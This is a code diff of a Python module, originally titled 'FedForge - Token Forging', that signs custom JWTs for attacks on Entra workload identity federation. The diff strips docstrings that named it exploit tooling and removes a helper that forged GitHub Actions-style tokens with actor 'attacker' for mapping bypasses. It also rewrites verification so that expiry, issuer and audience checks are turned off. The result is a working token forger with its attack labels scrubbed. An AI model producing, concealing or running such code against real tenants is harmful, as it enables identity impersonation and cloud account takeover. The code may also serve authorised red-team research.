@@ -1,16 +1,9 @@
-"""
-FedForge - Token Forging
-Create custom JWT tokens for federation attacks
-"""
-
 import jwt
 import time
 from datetime import datetime, timedelta
 
 
 class TokenForge:
-    """Forge JWT tokens for Entra WIF exploitation"""
-    
     def __init__(self, private_key, kid="key-1"):
         self.private_key = private_key
         self.kid = kid
@@ -23,19 +16,7 @@ class TokenForge:
         additional_claims=None,
         lifetime=3600
     ):
-        """
-        Create a JWT token for federation
-        
-        Args:
-            issuer: The issuer URL (your OIDC provider)
-            subject: Subject identifier (e.g., "system:serviceaccount:myapp")
-            audience: Token audience (default is Entra's standard)
-            additional_claims: Dict of additional claims to include
-            lifetime: Token lifetime in seconds (default 1 hour)
-        
-        Returns:
-            JWT token string
-        """
+
         now = int(time.time())
         
         # Standard claims
@@ -62,23 +43,23 @@ class TokenForge:
         
         return token
     
-    def decode_token(self, token, verify=False):
-        """
-        Decode a JWT token (for debugging)
-        
-        Args:
-            token: JWT token string
-            verify: Whether to verify signature (default False for debugging)
-        
-        Returns:
-            Decoded token payload
-        """
+    def decode_token(self, token, verify=False, public_key=None):
         if verify:
-            # Would need public key to verify
+            # Check the signature without requiring audience or time claims
+            key = public_key if public_key is not None else self.private_key.public_key()
             decoded = jwt.decode(
                 token,
-                self.private_key.public_key(),
-                algorithms=["RS256"]
+                key,
+                algorithms=["RS256"],
+                options={
+                    "verify_exp": False,
+                    "verify_nbf": False,
+                    "verify_iat": False,
+                    "verify_aud": False,
+                    "verify_iss": False,
+                    "verify_sub": False,
+                    "verify_jti": False
+                }
             )
         else:
             # Just decode without verification
@@ -90,7 +71,6 @@ class TokenForge:
         return decoded
     
     def print_token_info(self, token):
-        """Print human-readable token information"""
         try:
             decoded = self.decode_token(token, verify=False)
             
@@ -101,7 +81,6 @@ class TokenForge:
             print(f"Subject (sub):    {decoded.get('sub')}")
             print(f"Audience (aud):   {decoded.get('aud')}")
             
-            # Format timestamps
             if 'iat' in decoded:
                 iat = datetime.fromtimestamp(decoded['iat'])
                 print(f"Issued At (iat):  {iat.strftime('%Y-%m-%d %H:%M:%S')}")
@@ -110,7 +89,6 @@ class TokenForge:
                 exp = datetime.fromtimestamp(decoded['exp'])
                 print(f"Expires (exp):    {exp.strftime('%Y-%m-%d %H:%M:%S')}")
                 
-                # Show time remaining
                 now = datetime.now()
                 if exp > now:
                     remaining = exp - now
@@ -118,7 +96,6 @@ class TokenForge:
                 else:
                     print(f"Status:           EXPIRED")
             
-            # Show any additional claims
             standard_claims = {'iss', 'sub', 'aud', 'exp', 'iat', 'nbf'}
             additional = {k: v for k, v in decoded.items() if k not in standard_claims}
             
@@ -131,27 +108,3 @@ class TokenForge:
             
         except Exception as e:
             print(f"[!] Error decoding token: {e}")
-
-
-def create_github_actions_token(forge, repo, ref="refs/heads/main", actor="attacker"):
-    """
-    Helper function to create a GitHub Actions-style token
-    Useful for testing attribute mapping bypasses
-    """
-    issuer = "https://token.actions.githubusercontent.com"
-    subject = f"repo:{repo}:ref:{ref}"
-    
-    additional_claims = {
-        "repository": repo,
-        "ref": ref,
-        "actor": actor,
-        "workflow": "CI",
-        "job_workflow_ref": f"{repo}/.github/workflows/ci.yml@{ref}",
-    }
-    
-    return forge.create_token(
-        issuer=issuer,
-        subject=subject,
-        audience="api://AzureADTokenExchange",
-        additional_claims=additional_claims
-    )
